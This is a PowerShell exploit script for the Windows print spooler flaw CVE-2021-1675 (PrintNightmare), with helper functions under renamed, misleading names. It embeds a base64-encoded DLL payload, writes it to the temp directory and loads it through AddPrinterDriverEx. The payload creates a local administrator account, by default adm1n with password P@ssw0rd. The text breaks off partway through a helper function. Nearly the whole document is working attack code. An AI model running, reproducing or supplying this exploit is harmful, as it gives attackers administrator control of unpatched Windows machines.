function lactation
{
    param (
        [string]$DriverName = "Totally Not Malicious",
        [string]$NewUser = "",
        [string]$NewPassword = "",
        [string]$DLL = ""
    )
    if ( $DLL -eq "" ){
        $nightmare_data = [byte[]](Danielle)
        $encoder = New-Object System.Text.UnicodeEncoding
        if ( $NewUser -ne "" ) {
            $NewUserBytes = $encoder.GetBytes($NewUser)
            [System.Buffer]::BlockCopy($NewUserBytes, 0, $nightmare_data, 0x32e20, $NewUserBytes.Length)
            $nightmare_data[0x32e20+$NewUserBytes.Length] = 0
            $nightmare_data[0x32e20+$NewUserBytes.Length+1] = 0
        } else {
            Write-Host "[+] using default new user: adm1n"
        }
        if ( $NewPassword -ne "" ) {
            $NewPasswordBytes = $encoder.GetBytes($NewPassword)
            [System.Buffer]::BlockCopy($NewPasswordBytes, 0, $nightmare_data, 0x32c20, $NewPasswordBytes.Length)
            $nightmare_data[0x32c20+$NewPasswordBytes.Length] = 0
            $nightmare_data[0x32c20+$NewPasswordBytes.Length+1] = 0
        } else {
            Write-Host "[+] using default new password: P@ssw0rd"
        }
        $DLL = [System.IO.Path]::GetTempPath() + "nightmare.dll"
        [System.IO.File]::WriteAllBytes($DLL, $nightmare_data)
        Write-Host "[+] created payload at $DLL"
        $delete_me = $true
    } else {
        Write-Host "[+] using user-supplied payload at $DLL"
        Write-Host "[!] ignoring NewUser and NewPassword arguments"
        $delete_me = $false
    }
    $Mod = suspicious -ModuleName "A$(Get-Random)"
    $FunctionDefinitions = @(
      (func winspool.drv AddPrinterDriverEx ([bool]) @([string], [Uint32], [IntPtr], [Uint32]) -Charset Auto -SetLastError),
      (func winspool.drv EnumPrinterDrivers([bool]) @( [string], [string], [Uint32], [IntPtr], [UInt32], [Uint32].MakeByRefType(), [Uint32].MakeByRefType()) -Charset Auto -SetLastError)
    )
    $Types = $FunctionDefinitions | geegaw -Module $Mod -Namespace 'Mod'
    $DRIVER_INFO_2 = meshed $Mod DRIVER_INFO_2 @{
        cVersion = field 0 Uint64;
        pName = field 1 string -MarshalAs @("LPTStr");
        pEnvironment = field 2 string -MarshalAs @("LPTStr");
        pDriverPath = field 3 string -MarshalAs @("LPTStr");
        pDataFile = field 4 string -MarshalAs @("LPTStr");
        pConfigFile = field 5 string -MarshalAs @("LPTStr");
    }
    $winspool = $Types['winspool.drv']
    $APD_COPY_ALL_FILES = 0x00000004
    [Uint32]($cbNeeded) = 0
    [Uint32]($cReturned) = 0
    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, [IntPtr]::Zero, 0, [ref]$cbNeeded, [ref]$cReturned) ){
        Write-Host "[!] EnumPrinterDrivers should fail!"
        return
    }
    [IntPtr]$pAddr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([Uint32]($cbNeeded))
    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, $pAddr, $cbNeeded, [ref]$cbNeeded, [ref]$cReturned) ){
        $driver = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pAddr, [System.Type]$DRIVER_INFO_2)
    } else {
        Write-Host "[!] failed to get current driver list"
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)
        return
    }
    Write-Host "[+] using pDriverPath = `"$($driver.pDriverPath)`""
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)
    $driver_info = New-Object $DRIVER_INFO_2
    $driver_info.cVersion = 3
    $driver_info.pConfigFile = $DLL
    $driver_info.pDataFile = $DLL
    $driver_info.pDriverPath = $driver.pDriverPath
    $driver_info.pEnvironment = "Windows x64"
    $driver_info.pName = $DriverName
    $pDriverInfo = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($driver_info))
    [System.Runtime.InteropServices.Marshal]::StructureToPtr($driver_info, $pDriverInfo, $false)
    if ( $winspool::AddPrinterDriverEx($null, 2, $pDriverInfo, $APD_COPY_ALL_FILES -bor 0x10 -bor 0x8000) ) {
        if ( $delete_me ) {
            Write-Host "[+] added user $NewUser as local administrator"
        } else {
            Write-Host "[+] driver appears to have been loaded!"
        }
    } else {
        Write-Error "[!] AddPrinterDriverEx failed"
    }
    if ( $delete_me ) {
        Write-Host "[+] deleting payload from $DLL"
        Remove-Item -Force $DLL
    }
}
function Danielle
{
    $nightmare_data = [System.Convert]::FromBase64String("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dwAwAHIAZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYQBkAG0AMQBuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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")
    $nightmare_ms = New-Object System.IO.MemoryStream -ArgumentList @(,$nightmare_data)
    $ms = New-Object System.IO.MemoryStream
    $gzs = New-Object System.IO.Compression.GZipStream -ArgumentList @($nightmare_ms, [System.IO.Compression.CompressionMode]::Decompress)
    $gzs.CopyTo($ms)
    $gzs.Close()
    $nightmare_ms.Close()
    return $ms.ToArray()
}
function suspicious {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
